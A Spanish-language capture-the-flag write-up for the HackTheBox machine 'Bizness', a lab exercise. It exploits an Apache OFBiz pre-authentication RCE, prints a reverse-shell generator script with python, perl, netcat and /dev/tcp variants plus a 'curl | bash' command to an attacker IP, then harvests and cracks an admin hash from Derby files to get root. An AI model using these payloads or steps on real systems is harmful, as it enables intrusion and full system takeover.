---
tags:
title: Bizness - Easy (HTB)
permalink: /Bizness-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon


```bash
 nmap -sCV -p22,80,443,34765 10.129.221.24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 00:19 -0500
Nmap scan report for bizness.htb (10.129.221.24)
Host is up (0.60s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: BizNess Incorporated
|_ssl-date: TLS randomness does not represent time
34765/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.72 seconds
```

## Website

En la pagina principal no hay mucha información.

![image-center](/assets/images/Pasted image 20260206022141.png)
### Apache OBiz RCE

Viendo en el pie de la web, veo que corre `Apache OBi`z.

![image-center](/assets/images/Pasted image 20260206024041.png)

## Shell as ofbiz
### Reverse shell file

Buscando por exploits para este servicio, encontré [este script](https://github.com/securelayer7/CVE-2024-38856_Scanner) en Python, donde el mismo usa la pre-autenticación para poder ejecutar código remoto en el sistema. En mi caso cree un payload el cual se encarga de enviarme un `Reverse shell` a mi maquina.

Dicho script yo ya la tengo en mi maquina para generar una rev shell en un archivo `index.html`. Y es el siguiente:

```python
#!/usr/bin/env python
import os, sys

payload = '''
if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("x.x.x.x",yyyy)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="x.x.x.x";$p=yyyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/x.x.x.x/yyyy 0>&1
        exit;
fi
'''

if(len(sys.argv) < 3):
    print("[?] Usage gen_lin_rev ip port")
    exit(1)

payload = payload.replace("x.x.x.x", sys.argv[1]).replace("yyyy", sys.argv[2])

with open("index.html", "w") as f:
    f.write("#! /bin/sh\n\n" + payload)

print("[+] Wrote Linux reverse shells to {}/index.html".format(os.getcwd()))
```

Luego de indicarle el puerto y la ip, me deja el archivo en mi maquina.

```bash
gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/bizness/index.html
```

Por lo que me queda crear un servidor en Python, para poder servir el archivo y ejecutarlo con `bash` desde la maquina.

```bash
www
[eth0] 192.168.100.8
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/bizness]
allPorts  CVE-2024-38856_Scanner  exploit.sh  index.html  shell.sh  ysoserial-all.jar
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.221.24 - - [06/Feb/2026 00:41:44] "GET / HTTP/1.1" 200 -
```
### Shell

Ejecuto el script.

```bash
python3 cve-2024-38856_Scanner.py -t https://bizness.htb -p 443 --exploit -c 'curl 10.10.17.19|bash'
<SNIP>
[!] Request timed out for https://bizness.htb:443
[!] Exploit executed, but no output found in the response :
	[+] Target: https://bizness.htb, Port: 443
	[+] Status Code: timeout
```

Y desde mi listener veo como recibo la conexion como el usuario `ofbiz`
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.221.24] 58164
/bin/sh: 0: can't access tty; job control turned off
$ whoami
ofbiz
```

```bash
ofbiz@bizness:~$ cat user.txt
2273e1...
```
## Shell as root
### Enumeration

Después de un poco de research, descubrí que Apache `OFBiz`, tiene un base de datos, casi siempre en la ruta `/runtime/data/derby/ofbiz/seg0`, en archivos `.dat`, y los hashes los guarda en formato `SHA`.
### Database OFBiz file

Por lo que viendo el contenido de cada uno de estos archivos, filtre por `$SHA`, dándome así una coincidencia, con una credenciales del usuario `admin`.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ strings *.dat | grep '$SHA'
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```
### Decrypt password

Para poder descifrar esta password use [este script](https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker) que se encarga de hacerlo por mi, solo tengo que indicarle mediante el parametro `-s` la cadena a desencriptar.

Y así pude obtener la password del usuario admin.

```bash
python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
[+] Attempting to crack....
Found Password: monkeybizness
hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
(Attempts: 1478438)
[!] Super, I bet you could log into something with that!
```
### Shell

La misma era valida para el usuario `root` dentro de la maquina, por lo que migre a ese usuario.

```bash
ofbiz@bizness:/opt/ofbiz$ su root
Password:
root@bizness:/opt/ofbiz# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@bizness:~# cat root.txt
60abb4...
```

`~Happy Hacking.`